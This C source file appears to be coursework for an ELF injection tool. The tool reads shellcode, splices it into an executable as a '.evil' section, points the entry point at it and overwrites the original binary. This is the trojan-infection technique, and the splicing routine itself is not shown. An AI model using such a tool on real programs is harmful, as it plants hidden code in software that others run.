#include <stdio.h>
#include <getopt.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include "elf_tools.h"

/* 
 * inject(1): Inject a new section '.evil' into an ELF file and
 *   change the entry point to code in this section.
 *
 * Injects this section such that:
 *   1) If there is a .plt section, .evil is inserted before it,
 *       both in terms of virtual address and file location.
 *   2) If there is no .plt section, .evil is inserted before .text,
 *       both in terms of virtual address and file location.
 *   3) All relocation objects, symbols, string tables, etc are
 *       uncompromised.
 *   4) The header table is listed in order; ie the new section's
 *       location in the SHT corresponds to its actual location.
 *   5) The new ELF is expanded only enough to make room for the
 *       new data, and to maintain address alignment.
 *   6) All section->segment mappings are unmodified.
 *   7) The new section maps to the first 'LOAD' segment,
 *       where the rest of the code typically is.
 *
 * This program assumes that the input ELF is of the same bitsize
 *  as the inject program (but can be compiled in 32 and 64 bit 
 *  environments). Furthermore it assumes that the ELF conforms
 *  to typical conventions and is an executable file, not a 
 *  shared object.
 *
 * If a .evil section is already in the file, the program terminates.
 *
 *      James Sullivan <sullivan.james.f@gmail.com>
 *      University of Calgary
 *      10095183
 */

const char *SECT_NAME = ".evil";

/* Reads the entire contents of the file into memory
 * and returns a pointer to the containing buffer.
 * Returns -1 on failure, or the bytes read on success.
 */
int read_file(FILE *f, char **dat) 
{
    if(!f)
        return -1;

    /* Find the file size */
    size_t sz;
    fseek(f, 0L, SEEK_END);
    sz = ftell(f);
    fseek(f, 0L, SEEK_SET);

    *dat = malloc(sz);
    if(!*dat) {
        return -1;
    }
    int bytes_read;
    bytes_read = fread(*dat, 1, sz, f);
    if(bytes_read < sz) {
        free(*dat);
        *dat = NULL;
        return -1;
    }

    return bytes_read;
}

/* 
 * Prints the usage of the program.
 */
int print_usage(char *name)
{
    printf("Usage: %s shellcode program [-h -v]\n",name);
    return 0;
}

int main(int argc, char **argv, char **envp)
{
    if(argc < 3) {
        print_usage(argv[0]);
        exit(1);
    }
    char *shell = argv[1];
    char *elf = argv[2];

    FILE *shell_f, *elf_f;
    shell_f = NULL;
    elf_f = NULL;
    char *shell_dat, *elf_dat, *new_elf_dat;
    shell_dat = NULL;
    elf_dat = NULL;
    new_elf_dat = NULL;
    size_t shell_sz, elf_sz, new_elf_sz;

    /* Read in the shellcode from the data file */
    shell_f = fopen(shell, "rb");
    if(!shell_f) {
        fprintf(stderr, "Failed to open file %s\n",shell);
        goto fail;
    }
    shell_sz = read_file(shell_f, &shell_dat);
    if(!shell_dat) {
        fprintf(stderr, "Failed read from %s\n",shell);
        goto fail;
    }
    fclose(shell_f);
    shell_f = NULL;

    /* Check for \r in the shell */
    if(shell_dat[shell_sz-1] == '\x0a')
        shell_sz--;

    /* Read the ELF file into memory */
    elf_f = fopen(elf, "rb");
    if(!elf_f) {
        fprintf(stderr, "Failed to open file %s\n",elf);
        goto fail;
    }
    elf_sz = read_file(elf_f, &elf_dat);
    if(!elf_dat) {
        fprintf(stderr, "Failed read from %s\n",elf);
        goto fail;
    }
    fclose(elf_f);
    elf_f = NULL;

    /* Splice in the ELF section into new_elf_dat */
    new_elf_sz = inject_section(
            elf_dat, elf_sz, 
            shell_dat, shell_sz, 
            SECT_NAME, &new_elf_dat
            );
    free(elf_dat);
    elf_dat = NULL;
    free(shell_dat);
    shell_dat = NULL;
    if(new_elf_sz == -1) {
        fprintf(stderr, "Failed to splice section\n");
        goto fail;
    } else if(new_elf_sz == 0) {
        /* Nothing to do */
        fprintf(stderr, 
                "Nothing added to ELF (Section already exists)\n");
    } else {
        /* Write the new ELF to file */
        elf_f = fopen(elf, "wb");
        if(!elf_f) {
            fprintf(stderr, "Failed to open %s for writing\n",elf);
            goto fail;
        }
        errno = 0;
        fwrite(new_elf_dat, 1, new_elf_sz, elf_f); 
        if(errno) {
            fprintf(stderr, 
                    "Failed to write new ELF contents (error %d)\n",
                    errno);
            goto fail;
        }
        fclose(elf_f);
        elf_f = NULL;
        printf("Section %s injected into %s\n",SECT_NAME,elf);
        free(new_elf_dat);
    }
    return 0;

fail:
    if(shell_f) 
        fclose(shell_f);
    if(elf_f) 
        fclose(elf_f);
    if(shell_dat)
        free(shell_dat);
    if(elf_dat)
        free(elf_dat);
    return 1;
}
